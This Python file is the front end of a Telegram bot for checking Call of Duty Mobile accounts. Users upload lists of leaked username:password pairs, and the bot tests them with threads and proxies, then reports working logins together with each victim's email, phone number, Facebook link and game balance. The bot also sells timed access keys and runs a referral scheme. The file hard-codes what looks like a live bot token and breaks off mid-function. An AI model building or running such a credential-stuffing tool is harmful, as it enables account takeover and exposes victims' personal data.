#!/usr/bin/env python3
# =============================================================================
#  main.py  —  CODM Telegram Checker Bot  v5.1
#  Features: referral system (3 refs = 1h key), genkey with hours/minutes,
#  free starter pack (1h for new users), time‑based keys,
#  channel requirements: @CodmAndMlbb, @etoshim, @ShinDisscussion
#
#  Admin ID : 8621676055
#  Bot Token: 8597114754:AAH3nvgyXWg1KpQq1_Qn2Lva2J0yozUJxGc
#
#  Run:  python main.py
# =============================================================================

import os, sys, time, json, logging, random, re
import secrets, string, signal
from collections import deque
from copy import deepcopy
from datetime import datetime, timedelta
from pathlib import Path
from threading import Lock, Event, Thread

import telebot
from telebot import types
import colorama
from colorama import Fore as _F, Style as _S
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.box import ROUNDED, DOUBLE

# ── Checker engine ──────────────────────────────────────────────────────────
from checker import (
    ProxyManager, CookieManager, LiveStats, ResultsManager,
    sanitize_string, clean_account_line, CODM_REGIONS,
    run_check, get_user_results_dir,
)

colorama.init(autoreset=True)
console = Console()

# ── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)],
)
logger = logging.getLogger("CODM_BOT")
logging.getLogger("telebot").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.ERROR)
logging.getLogger("requests").setLevel(logging.ERROR)

# ── Paths ──────────────────────────────────────────────────────────────────
SCRIPT_DIR   = os.path.dirname(os.path.abspath(__file__))
COMBO_DIR    = os.path.join(SCRIPT_DIR, "Combo")
RESULTS_DIR  = os.path.join(SCRIPT_DIR, "Results")
CONFIG_FILE  = os.path.join(SCRIPT_DIR, "bot_config.json")
KEYS_FILE    = os.path.join(SCRIPT_DIR, "keys.json")
USERS_FILE   = os.path.join(SCRIPT_DIR, "users.json")

for _d in (COMBO_DIR, RESULTS_DIR):
    os.makedirs(_d, exist_ok=True)

# ── Constants ──────────────────────────────────────────────────────────────
ADMIN_IDS           = {8621676055}
CHANNEL_IDS = [
    "@CodmAndMlbb",
    "@etoshim",
    "@ShinDisscussion"
]
CHANNEL_LINKS = {
    "@CodmAndMlbb": "https://t.me/CodmAndMlbb",
    "@etoshim": "https://t.me/etoshim",
    "@ShinDisscussion": "https://t.me/ShinDisscussion"
}
DEFAULT_THREADS     = 50
REFERRALS_NEEDED    = 3
REFERRAL_REWARD_HOURS = 1

# ── Maintenance ────────────────────────────────────────────────────────────
_maintenance_state = {"active": False, "message": ""}
_maintenance_lock  = Lock()

# ── Pending key-choice activations ─────────────────────────────────────────
_pending_activations      = {}
_pending_activations_lock = Lock()

# ── Combo-action store ─────────────────────────────────────────────────────
_combo_actions      = {}
_combo_actions_lock = Lock()
_COMBO_ACTION_TTL   = 15 * 60   # seconds

# =============================================================================
#   JSON HELPERS
# =============================================================================

def _load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
    except Exception:
        pass
    return deepcopy(default)

def _save_json(path, data):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Save {path}: {e}")

# =============================================================================
#   CONFIG & BOT TOKEN
# =============================================================================

cfg       = _load_json(CONFIG_FILE, {})
BOT_TOKEN = "8597114754:AAH3nvgyXWg1KpQq1_Qn2Lva2J0yozUJxGc"

for _aid in cfg.get("extra_admins", []):
    ADMIN_IDS.add(int(_aid))

if not BOT_TOKEN:
    print("\n" + "=" * 60)
    print("  CODM BOT — FIRST RUN SETUP")
    print("=" * 60)
    print("  Paste your @BotFather token below.\n")
    BOT_TOKEN = input("  Bot Token: ").strip()
    if not BOT_TOKEN:
        print("  No token. Exiting.")
        sys.exit(1)
    cfg["bot_token"] = BOT_TOKEN
    _save_json(CONFIG_FILE, cfg)

# =============================================================================
#   DURATION PARSER (for genkey)
# =============================================================================
def parse_duration(text: str) -> int:
    """Convert 1h, 30m, 2d, 3600 -> seconds."""
    text = text.strip().lower()
    if text.endswith('h'):
        return int(text[:-1]) * 3600
    if text.endswith('m'):
        return int(text[:-1]) * 60
    if text.endswith('d'):
        return int(text[:-1]) * 86400
    try:
        return int(text)
    except ValueError:
        return 0

def duration_to_days(seconds: int) -> int:
    """Convert seconds to days (rounded up)."""
    if seconds <= 0:
        return 0
    # 1 day = 86400 seconds
    return max(1, (seconds + 86399) // 86400)

# =============================================================================
#   KEYS & USERS DB  (time‑based keys)
# =============================================================================
_keys_lock  = Lock()
_users_lock = Lock()

def load_keys():
    return _load_json(KEYS_FILE, {})

def save_keys(data):
    _save_json(KEYS_FILE, data)

def load_users():
    return _load_json(USERS_FILE, {})

def save_users(data):
    _save_json(USERS_FILE, data)

def gen_key(duration_seconds: int = 0, created_by: int = 0) -> str:
    """Generate a time‑based key with a validity in seconds."""
    chars = string.ascii_uppercase + string.digits
    key   = "CODM-" + "-".join("".join(random.choices(chars, k=5)) for _ in range(4))
    keys  = load_keys()
    now   = datetime.now()
    expiry = (now + timedelta(seconds=duration_seconds)).isoformat() if duration_seconds > 0 else None
    keys[key] = {
        "duration_seconds": duration_seconds,
        "created_by":       created_by,
        "created_at":       now.isoformat(),
        "activated_by":     None,
        "activated_at":     None,
        "key_expires":      expiry,
        "revoked":          False,
    }
    save_keys(keys)
    return key

def activate_key(user_id: int, key_val: str) -> bool:
    """Activate a time‑based key. Returns True on success."""
    with _keys_lock:
        keys  = load_keys()
        users = load_users()
        k     = keys.get(key_val)
        uid   = str(user_id)

        if not k:
            return False
        if k.get("revoked"):
            return False
        if k.get("activated_by") and k["activated_by"] != user_id:
            return False

        # Check if user already has an active key
        u = users.get(uid, {})
        existing_exp = u.get("key_expires")
        if existing_exp:
            try:
                if datetime.fromisoformat(existing_exp) > datetime.now():
                    return False
            except Exception:
                pass

        k["activated_by"] = user_id
        k["activated_at"] = datetime.now().isoformat()
        expiry = k.get("key_expires")
        save_keys(keys)

        if uid not in users:
            users[uid] = {}
        users[uid]["key"]          = key_val
        users[uid]["key_expires"]  = expiry
        users[uid]["activated_at"] = datetime.now().isoformat()
        users[uid]["is_starter"]   = users[uid].get("is_starter", False)   # preserve starter flag
        save_users(users)
        return True

def grant_free_hour(user_id: int) -> bool:
    """Grant a 1‑hour free key to a new user."""
    key = gen_key(duration_seconds=3600, created_by=0)   # 0 = system
    return activate_key(user_id, key)

def has_active_key(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return True
    users = load_users()
    uid   = str(user_id)
    u     = users.get(uid, {})
    kexp  = u.get("key_expires")
    if not kexp:
        return False
    try:
        return datetime.fromisoformat(kexp) >= datetime.now()
    except Exception:
        return False

def get_key_expiry(user_id: int) -> str | None:
    if user_id in ADMIN_IDS:
        return "Unlimited (Admin)"
    users = load_users()
    u     = users.get(str(user_id), {})
    return u.get("key_expires")

def register_user(message):
    uid = str(message.from_user.id)
    u   = message.from_user
    with _users_lock:
        users = load_users()
        if uid not in users:
            users[uid] = {}
        users[uid].update({
            "username":   u.username or "",
            "first_name": u.first_name or "",
            "last_name":  u.last_name or "",
            "last_seen":  datetime.now().isoformat(),
        })
        if "joined" not in users[uid]:
            users[uid]["joined"] = datetime.now().isoformat()
        # If user is new and not admin, grant free 1-hour starter key (once)
        if int(uid) not in ADMIN_IDS and not users[uid].get("starter_granted"):
            if grant_free_hour(int(uid)):
                users[uid]["starter_granted"] = True
                logger.info(f"Granted free 1-hour starter key to {uid}")
        save_users(users)

# ── Channel membership (ALL three channels) ──────────────────────────────
_MEMBER_STATUSES = {"member", "administrator", "creator", "restricted"}

def check_channel_membership(bot_instance, user_id: int) -> bool:
    """Returns True if user is in ALL three channels, False otherwise."""
    for channel in CHANNEL_IDS:
        try:
            member = bot_instance.get_chat_member(channel, user_id)
            if member.status in ("left", "kicked"):
                return False
        except Exception as exc:
            desc = str(exc).lower()
            if any(kw in desc for kw in ("user not found", "not a member", "user_not_participant")):
                return False
            logger.warning(f"[MEMBERSHIP] Could not verify {user_id} in {channel}: {exc} — passing through")
            return False   # fail-closed: if we can't verify, deny access
    return True

# ── Referral system (reworked for time-based rewards) ──────────────────────
def get_referral_stats(user_id: int) -> dict:
    users = load_users()
    uid   = str(user_id)
    u     = users.get(uid, {})
    return {
        "count":   int(u.get("referral_count", 0) or 0),
        "pending": int(u.get("referral_pending", 0) or 0),
        "bonuses": int(u.get("referral_bonuses", 0) or 0),
        "rewarded": bool(u.get("referral_rewarded", False)),
    }

def record_referral(referrer_id: int, new_user_id: int):
    if referrer_id == new_user_id:
        return False   # can't refer self

    with _users_lock:
        users = load_users()
        ruid  = str(referrer_id)
        nuid  = str(new_user_id)

        # Check if the new user was already referred
        if users.get(nuid, {}).get("referred_by"):
            return False

        # Ensure both exist
        if ruid not in users:
            users[ruid] = {}
        if nuid not in users:
            users[nuid] = {}

        users[nuid]["referred_by"]     = referrer_id

        # Increment referrer's count
        users[ruid]["referral_count"]  = int(users[ruid].get("referral_count", 0) or 0) + 1
        users[ruid]["referral_pending"] = int(users[ruid].get("referral_pending", 0) or 0) + 1

        pending = users[ruid]["referral_pending"]
        bonus_earned = False

        # Check if referrer reached the threshold (3)
        if pending >= REFERRALS_NEEDED:
            # Grant a 1-hour key
            key = gen_key(duration_seconds=3600, created_by=referrer_id)
            if key:
                # Activate it for the referrer
                if activate_key(referrer_id, key):
                    users[ruid]["referral_pending"] = pending - REFERRALS_NEEDED
                    users[ruid]["referral_bonuses"]  = int(users[ruid].get("referral_bonuses", 0) or 0) + 1
                    users[ruid]["referral_rewarded"] = True
                    bonus_earned = True
                    # Log in referrer's history
                    users[ruid].setdefault("referral_log", []).append(
                        f"{datetime.now().isoformat()}: Earned 1h key for {REFERRALS_NEEDED} referrals"
                    )
            # If key generation fails, keep pending
        save_users(users)
        return bonus_earned

# =============================================================================
#   QUEUE SYSTEM
# =============================================================================
class QueueItem:
    def __init__(self, user_id, chat_id, username, combo_file, threads):
        self.user_id    = user_id
        self.chat_id    = chat_id
        self.username   = username or str(user_id)
        self.combo_file = combo_file
        self.threads    = threads
        self.added_at   = time.time()
        self.combo_name = Path(combo_file).name

class CheckQueue:
    def __init__(self):
        self._q    = deque()
        self._lock = Lock()

    def add(self, item: QueueItem) -> int:
        with self._lock:
            for existing in self._q:
                if existing.user_id == item.user_id:
                    return -1
            self._q.append(item)
            return len(self._q)

    def pop(self) -> QueueItem | None:
        with self._lock:
            return self._q.popleft() if self._q else None

    def remove_user(self, user_id: int) -> bool:
        with self._lock:
            for item in list(self._q):
                if item.user_id == user_id:
                    self._q.remove(item)
                    return True
        return False

    def size(self):
        return len(self._q)

    def snapshot(self):
        with self._lock:
            return list(self._q)

    def has_user(self, user_id):
        with self._lock:
            return any(i.user_id == user_id for i in self._q)

QUEUE = CheckQueue()

# =============================================================================
#   BOT STATE
# =============================================================================
class BotState:
    def __init__(self):
        self.is_checking     = False
        self.stop_event      = Event()
        self.live_stats:     LiveStats | None      = None
        self.results_mgr:    ResultsManager | None = None
        self.stats_msg_id    = None
        self.chat_id         = None
        self.current_user_id = None
        self.total           = 0
        self.threads         = DEFAULT_THREADS
        self.combo_file      = None
        self.task_name       = ""
        self.proxy_mgr:      ProxyManager | None   = None
        self.cookie_mgr:     CookieManager | None  = None
        self._lock           = Lock()

    def begin(self, item: QueueItem):
        with self._lock:
            self.is_checking     = True
            self.stop_event      = Event()
            self.live_stats      = LiveStats()
            self.results_mgr     = ResultsManager(Path(item.combo_file).stem, user_id=item.user_id)
            self.chat_id         = item.chat_id
            self.current_user_id = item.user_id
            self.threads         = item.threads
            self.combo_file      = item.combo_file
            self.task_name       = Path(item.combo_file).stem
            self.proxy_mgr       = ProxyManager()
            self.cookie_mgr      = CookieManager()

    def set_total(self, n):
        with self._lock:
            self.total = n
            if self.live_stats:
                self.live_stats.total = n

    def stop(self):
        self.stop_event.set()

    def finish(self):
        with self._lock:
            self.is_checking     = False
            self.current_user_id = None

    def should_stop(self):
        return self.stop_event.is_set()

STATE = BotState()

# =============================================================================
#   BOT INIT
# =============================================================================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
BOT_USERNAME = ""

def esc(text):
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_user_combo_dir(user_id: int) -> str:
    d = os.path.join(COMBO_DIR, str(user_id))
    os.makedirs(d, exist_ok=True)
    return d

def get_referral_link(user_id: int) -> str:
    if BOT_USERNAME:
        return f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
    return "(start the bot, then use /referral to get your link)"

# =============================================================================
#   STATS TEXT BUILDERS
# =============================================================================
def build_stats_text(ls: LiveStats | None = None, done: bool = False, stopped: bool = False) -> str:
    ls = ls or STATE.live_stats
    if not ls:
        return "<b>No active session.</b>"
    s    = ls.snap()
    proc = s["valid"] + s["invalid"] + s["error"]
    total = s["total"]
    el   = max(time.time() - s["start_time"], 0.001)
    rate = proc / el
    pct  = proc / total * 100 if total > 0 else 0
    left = total - proc
    eta  = left / rate if rate > 0 else 0
    bar_w = 20
    bar   = "█" * int(pct / 100 * bar_w) + "░" * (bar_w - int(pct / 100 * bar_w))

    if done:       status = "✅ COMPLETE"
    elif stopped:  status = "🔴 STOPPED"
    else:          status = "🟢 RUNNING"

    lines = [
        f"<b>{'━'*28}</b>",
        f"<b>CODM BOT  —  {status}</b>",
        f"<b>{'━'*28}</b>",
        f"<code>{bar}</code>  <b>{pct:.1f}%</b>",
        f"<b>Checked:</b>  {proc:,} / {total:,}",
        f"<b>Rate:</b>     {rate:.1f} acc/s",
        f"<b>Elapsed:</b>  {int(el // 60)}m {int(el % 60):02d}s",
        (f"<b>ETA:</b>      {int(eta // 60)}m {int(eta % 60):02d}s" if not done else ""),
        f"{'━'*28}",
        f"✔ Valid:       <b>{s['valid']}</b>",
        f"✖ Invalid:     <b>{s['invalid']}</b>",
        f"· Errors:      <b>{s['error']}</b>",
        f"{'━'*28}",
        f"✨ Clean:      <b>{s['clean']}</b>",
        f"⊘ Not Clean:  <b>{s['not_clean']}</b>",
        f"◈ Has CODM:   <b>{s['has_codm']}</b>",
        f"○ No CODM:    <b>{s['no_codm']}</b>",
        f"{'━'*28}",
        f"▲ Top Level:  <b>{s['highest_level']}</b>",
        f"◆ Top Shell:  <b>{s['highest_shell']:,}</b>",
    ]
    rc = s.get("region_counts", {})
    if rc:
        lines.append("━" * 28)
        for reg, cnt in sorted(rc.items(), key=lambda x: x[1], reverse=True)[:5]:
            ri = CODM_REGIONS.get(reg, {})
            lines.append(f"{ri.get('flag', '🌐')} {ri.get('name', reg)}: <b>{cnt}</b>")
    if done and STATE.results_mgr:
        lines += ["━" * 28, f"📁 <code>{STATE.results_mgr.base}</code>"]
    lines = [l for l in lines if l != ""]
    lines.append("━" * 28)
    return "\n".join(lines)

def build_queue_text() -> str:
    items = QUEUE.snapshot()
    if not items:
        return (
            "<b>📝 Queue Status</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Queue is empty."
        )
    lines = [
        "<b>📝 Queue Status</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        "",
        f"<b>{len(items)} user(s) waiting:</b>",
        "",
    ]
    for i, item in enumerate(items, 1):
        lines.append(f"{i}. 🆔 <code>{item.user_id}</code> - <code>{item.combo_name}</code>")
    return "\n".join(lines)

# =============================================================================
#   LIVE STATS UPDATER
# =============================================================================
def _stats_updater_thread(chat_id: int, msg_id: int, ls: LiveStats, stop_ev: Event):
    while True:
        time.sleep(5)
        if not STATE.is_checking or STATE.chat_id != chat_id or STATE.stats_msg_id != msg_id:
            break
        try:
            text = build_stats_text(ls=ls, done=False, stopped=stop_ev.is_set())
            bot.edit_message_text(chat_id=chat_id, message_id=msg_id,
                                  text=text, parse_mode="HTML")
        except telebot.apihelper.ApiTelegramException as e:
            if "message is not modified" in str(e):
                pass
            elif "message to edit not found" in str(e):
                break
        except Exception:
            pass

# =============================================================================
#   TERMINAL LOGGER & HIT SENDER
# =============================================================================
def _log_terminal_result(result):
    acc = result.get("account", "?")
    if result.get("is_error"):
        reason = result.get("error_reason", "")
        console.print(f"  [bold red]✖ ERR[/bold red]  [dim]{acc}  {reason}[/dim]")
    elif not result.get("valid", True):
        reason = result.get("error_reason", "Invalid")
        console.print(
            f"  [bold bright_red]✖ INVALID[/bold bright_red]  "
            f"[dim]{acc}[/dim]  [yellow]{reason}[/yellow]"
        )
    elif result.get("has_codm"):
        tag  = ("[bold bright_green]✨ CLEAN[/bold bright_green]"
                if result.get("is_clean")
                else "[bold yellow]⊘ NOT CLEAN[/bold yellow]")
        lvl  = result.get("codm_level", "?")
        nick = sanitize_string(result.get("codm_nickname", "?")) or "?"
        reg  = result.get("codm_region", "?")
        console.print(
            f"  {tag}  [bright_white]{acc}[/bright_white]  [dim]Lv{lvl}·{nick}·{reg}[/dim]"
        )
    else:
        console.print(f"  [cyan]○ VALID (No CODM)[/cyan]  [dim]{acc}[/dim]")

def _send_hit(chat_id, ad):
    is_clean = ad.get("is_clean", False)
    tag      = "✨ CLEAN HIT" if is_clean else "⊘ NOT CLEAN HIT"
    shell    = int(ad.get("shell_balance", 0) or 0)
    text = (
        f"<b>{tag}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Account  :</b> <code>{esc(ad.get('account',''))}:{esc(ad.get('password',''))}</code>\n"
        f"<b>UID      :</b> {esc(ad.get('uid','N/A'))}\n"
        f"<b>Username :</b> {esc(sanitize_string(ad.get('username','N/A')))}\n"
        f"<b>Email    :</b> {esc(ad.get('email_display','N/A'))}\n"
        f"<b>Mobile   :</b> {esc(ad.get('formatted_mobile','N/A'))}\n"
        f"<b>Country  :</b> {esc(ad.get('country','N/A'))}\n"
        f"<b>Facebook :</b> {esc(ad.get('fb_info','N/A'))}\n"
        f"<b>Shells   :</b> {shell:,}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>CODM Lv  :</b> {ad.get('codm_level','N/A')}\n"
        f"<b>Region   :</b> {esc(ad.get('codm_region','N/A'))}\n"
        f"<b>IGN      :</b> {esc(sanitize_string(ad.get('codm_nickname','N/A')) or 'N/A')}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>Status   :</b> {'✅ Clean' if is_clean else '⚠️ Not Clean'}\n"
        f"<b>Last Login:</b> {esc(ad.get('last_login_date','N/A'))}\n"
        f"<b>Login Via :</b> {esc(ad.get('last_login_where','N/A'))}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>@CodmAndMlbb</i>"
    )
    bot.send_message(chat_id, text, parse_mode="HTML")

def _send_final_stats(chat_id, ls, stopped):
    try:
        final = build_stats_text(ls=ls, done=not stopped, stopped=stopped)
        bot.send_message(chat_id, final, parse_mode="HTML")
        if STATE.stats_msg_id:
            try:
                bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=STATE.stats_msg_id,
                    text=final,
                    parse_mode="HTML",
                )
            except Exception:
                pass
    except Exception as e:
        logger.error(f"[FINAL MSG] {e}")

def _send_result_files(chat_id: int, rm: ResultsManager):
    result_files = rm.get_result_files()
    if not result_files:
        try:
            bot.send_message(chat_id, "📭 <b>No valid accounts found.</b>", parse_mode="HTML")
        except Exception:
            pass
        return

    summary = "📦 <b>Result Files</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for label, fp in result_files.items():
        try:
            with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                cnt = f.read().count("Account    :")
            summary += f"{label}: <b>{cnt}</b>\n"
        except Exception:
            summary += f"{label}: ✓\n"
    summary += "\n<i>Sending files below...</i>"
    try:
        bot.send_message(chat_id, summary, parse_mode="HTML")
    except Exception:
        pass

    for label, fp in result_files.items():
        try:
            with open(fp, "rb") as f:
                bot.send_document(
                    chat_id,
                    f,
                    caption=f"<b>{label}</b>\n<i>CODM Checker — @CodmAndMlbb</i>",
                    visible_file_name=fp.name,
                    parse_mode="HTML",
                )
            time.sleep(0.5)
        except Exception as e:
            logger.error(f"[SEND FILE] {label}: {e}")

# =============================================================================
#   QUEUE PROCESSOR
# =============================================================================
def _load_accounts(combo_file) -> list:
    accounts = []
    try:
        with open(combo_file, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                acc, pwd = clean_account_line(line)
                if acc and pwd:
                    accounts.append((acc, pwd))
    except Exception as e:
        logger.error(f"[LOAD] {e}")
    return accounts

def _process_next_queue():
    next_item = QUEUE.pop()
    if not next_item:
        return
    try:
        accounts = _load_accounts(next_item.combo_file)
        if not accounts:
            try:
                bot.send_message(
                    next_item.chat_id,
                    "❌ <b>Combo file is empty or invalid.</b>",
                    parse_mode="HTML",
                )
            except Exception:
                pass
            _process_next_queue()
            return

        STATE.begin(next_item)
        STATE.set_total(len(accounts))
        pm  = STATE.proxy_mgr
        msg = bot.send_message(
            next_item.chat_id,
            f"<b>🚀 CHECK STARTED</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>File:</b>     <code>{Path(next_item.combo_file).name}</code>\n"
            f"<b>Accounts:</b> {len(accounts):,}\n"
            f"<b>Threads:</b>  {next_item.threads}\n"
            f"<b>Proxies:</b>  {'✅ ' + str(pm.count()) if pm and pm.loaded() else '❌ No proxies'}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>Stats update every 5s  ·  /stop to stop</i>",
            parse_mode="HTML",
        )
        STATE.stats_msg_id = msg.message_id
        Thread(
            target=_stats_updater_thread,
            args=(next_item.chat_id, msg.message_id, STATE.live_stats, STATE.stop_event),
            daemon=True,
        ).start()
        Thread(
            target=run_check,
            args=(
                next_item, accounts, STATE,
                _send_hit, _send_final_stats,
                _send_result_files, _log_terminal_result,
                _process_next_queue,
            ),
            daemon=True,
        ).start()
    except Exception as e:
        logger.error(f"[QUEUE NEXT] {e}", exc_info=True)
        STATE.finish()
        _process_next_queue()

def _start_or_queue(user_id, chat_id, username, combo_file, threads):
    if STATE.is_checking:
        item = QueueItem(user_id, chat_id, username, combo_file, threads)
        pos  = QUEUE.add(item)
        if pos == -1:
            try:
                bot.send_message(
                    chat_id,
                    "⚠️ You are already in the queue. Use /queue to check position.",
                    parse_mode="HTML",
                )
            except Exception:
                pass
            return
        try:
            bot.send_message(
                chat_id,
                f"⏳ <b>Added to queue — position #{pos}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"<b>File:</b>  <code>{Path(combo_file).name}</code>\n\n"
                f"You'll be notified when your check starts.\n"
                f"Use /queue to monitor.",
                parse_mode="HTML",
            )
        except Exception:
            pass
        return

    accounts = _load_accounts(combo_file)
    if not accounts:
        bot.send_message(
            chat_id,
            "❌ <b>No valid accounts found.</b>\nFormat: <code>account:password</code>",
            parse_mode="HTML",
        )
        return

    item = QueueItem(user_id, chat_id, username, combo_file, threads)
    STATE.begin(item)
    STATE.set_total(len(accounts))
    pm = STATE.proxy_mgr
    msg = bot.send_message(
        chat_id,
        f"<b>🚀 CHECK STARTED</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>File:</b>     <code>{Path(combo_file).name}</code>\n"
        f"<b>Accounts:</b> {len(accounts):,}\n"
        f"<b>Threads:</b>  {threads}\n"
        f"<b>Proxies:</b>  {'✅ ' + str(pm.count()) if pm and pm.loaded() else '❌ No proxies'}\n"
        f"<b>Cookies:</b>  {STATE.cookie_mgr.count() if STATE.cookie_mgr else 0} loaded\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<i>Stats update every 5s  ·  /stop to stop</i>",
        parse_mode="HTML",
    )
    STATE.stats_msg_id = msg.message_id
    Thread(
        target=_stats_updater_thread,
        args=(chat_id, msg.message_id, STATE.live_stats, STATE.stop_event),
        daemon=True,
    ).start()
    Thread(
        target=run_check,
        args=(
            item, accounts, STATE,
            _send_hit, _send_final_stats,
            _send_result_files, _log_terminal_result,
            _process_next_queue,
        ),
        daemon=True,
    ).start()

# =============================================================================
#   COMBO ACTION STORE
# =============================================================================
def _new_combo_action(user_id, threads, combo_file):
    now = time.time()
    with _combo_actions_lock:
        for key, action in list(_combo_actions.items()):
            if now - action["created_at"] > _COMBO_ACTION_TTL:
                del _combo_actions[key]
        action_id = secrets.token_urlsafe(8)
        _combo_actions[action_id] = {
            "user_id":    int(user_id),
            "threads":    int(threads),
            "combo_file": str(combo_file),
            "created_at": now,
        }
    return action_id

def _get_combo_action(action_id):
    now = time.time()
    with _combo_actions_lock:
        action = _combo_actions.get(action_id)
        if not action:
            return None
        if now - action["created_at"] > _COMBO_ACTION_TTL:
            del _combo_actions[action_id]
            return None
        return dict(action)

def _delete_combo_action(action_id):
    with _combo_actions_lock:
        _combo_actions.pop(action_id, None)

# =============================================================================
#   ACCESS GATES
# =============================================================================
def _send_join_prompt(chat_id: int):
    markup = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNEL_IDS:
        markup.add(types.InlineKeyboardButton(f"📢 Join {ch}", url=CHANNEL_LINKS[ch]))
    markup.add(types.InlineKeyboardButton("✅ Verify Membership", callback_data="verify_channel"))
    bot.send_message(
        chat_id,
        f"<b>🔒 Channel Membership Required</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"You must join <b>all three</b> channels to use this bot:\n\n"
        + "\n".join(f"• {CHANNEL_LINKS[ch]}" for ch in CHANNEL_IDS) +
        f"\n\n<b>Steps:</b>\n"
        f"1. Click each <b>Join Channel</b> button below\n"
        f"2. Click <b>Verify Membership</b> to confirm\n\n"
        f"<i>Join once — use forever!</i>",
        parse_mode="HTML",
        reply_markup=markup,
    )

def channel_gate(message) -> bool:
    uid = message.from_user.id
    if uid in ADMIN_IDS:
        return True
    if not check_channel_membership(bot, uid):
        _send_join_prompt(message.chat.id)
        return False
    return True

def access_gate(message) -> bool:
    register_user(message)
    uid = message.from_user.id
    if uid in ADMIN_IDS:
        return True
    if _maintenance_state["active"]:
        bot.send_message(
            message.chat.id,
            f"🔧 <b>Bot is under maintenance</b>\n\n"
            f"{_maintenance_state['message']}\n\n"
            f"<i>Please wait for the admin to restore service.</i>",
            parse_mode="HTML",
        )
        return False
    users = load_users()
    u     = users.get(str(uid), {})
    if u.get("banned"):
        bot.send_message(message.chat.id, "🚫 <b>You are banned from using this bot.</b>", parse_mode="HTML")
        return False
    if not channel_gate(message):
        return False
    return True

def admin_only(message) -> bool:
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "🚫 <b>Admin only command.</b>", parse_mode="HTML")
        return False
    return True

# =============================================================================
#   BOT COMMANDS
# =============================================================================

@bot.message_handler(commands=["start"])
def cmd_start(message):
    register_user(message)
    uid  = message.from_user.id
    text = message.text.strip()
    args = text.split(maxsplit=1)[1] if len(text.split()) > 1 else ""

    # ── Referral handling ──────────────────────────────────────────────
    if args.startswith("ref_"):
        try:
            referrer_id = int(args[4:])
            bonus_earned = record_referral(referrer_id, uid)
            if bonus_earned:
                try:
                    bot.send_message(
                        referrer_id,
                        f"🎉 <b>Referral Bonus Unlocked!</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"You reached <b>{REFERRALS_NEEDED}</b> referrals!\n"
                        f"<b>+1 Hour Free Key</b> has been added to your account.\n\n"
                        f"Use /mykey to check your new key.\n"
                        f"Keep sharing to earn more!",
                        parse_mode="HTML",
                    )
                except Exception:
                    pass
        except (ValueError, TypeError):
            pass

    if uid not in ADMIN_IDS and not check_channel_membership(bot, uid):
        _send_join_prompt(message.chat.id)
        return

    name  = message.from_user.first_name or "User"
    expiry = get_key_expiry(uid)

    # ── Check if user got starter pack ────────────────────────────────
    users = load_users()
    u     = users.get(str(uid), {})
    starter_granted = u.get("starter_granted", False)

    if uid in ADMIN_IDS:
        key_status = "👑 <b>Admin</b> — unlimited"
    elif expiry:
        try:
            exp_dt = datetime.fromisoformat(expiry)
            if exp_dt > datetime.now():
                days_left = (exp_dt - datetime.now()).days
                hours_left = (exp_dt - datetime.now()).seconds // 3600
                if days_left > 0:
                    key_status = f"🔑 <b>Active key</b> — expires in {days_left}d"
                else:
                    key_status = f"🔑 <b>Active key</b> — expires in {hours_left}h"
            else:
                key_status = "⚠️ <b>Key expired</b> — use /activate"
        except Exception:
            key_status = "ℹ️ Key status unknown"
    else:
        key_status = "🆓 <b>No key</b> — use /activate to get started"

    # Show starter status if applicable
    starter_line = ""
    if starter_granted and not expiry:
        # They got the starter but it expired
        starter_line = "\n⚠️ Your free 1-hour starter key has expired. Use /activate to get a new key."
    elif not starter_granted and uid not in ADMIN_IDS:
        # Should not happen because register_user grants it, but just in case
        grant_free_hour(uid)
        starter_line = "\n🎁 You've been granted a <b>1-hour free starter key</b>!"

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📋 Help",     callback_data="cmd:help"),
        types.InlineKeyboardButton("🔑 My Key",   callback_data="cmd:mykey"),
        types.InlineKeyboardButton("📊 Stats",    callback_data="cmd:stats"),
        types.InlineKeyboardButton("🔗 Referral", callback_data="cmd:referral"),
    )
    bot.send_message(
        message.chat.id,
        f"<b>🎮 CODM Account Checker Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Welcome, <b>{esc(name)}</b>!\n\n"
        f"{key_status}"
        f"{starter_line}\n\n"
        f"<b>How to use:</b>\n"
        f"• Send a <code>.txt</code> combo file to start checking\n"
        f"• Format: <code>account:password</code> (one per line)\n\n"
        f"📢 Required Channels:\n"
        + "\n".join(f"• {CHANNEL_LINKS[ch]}" for ch in CHANNEL_IDS) +
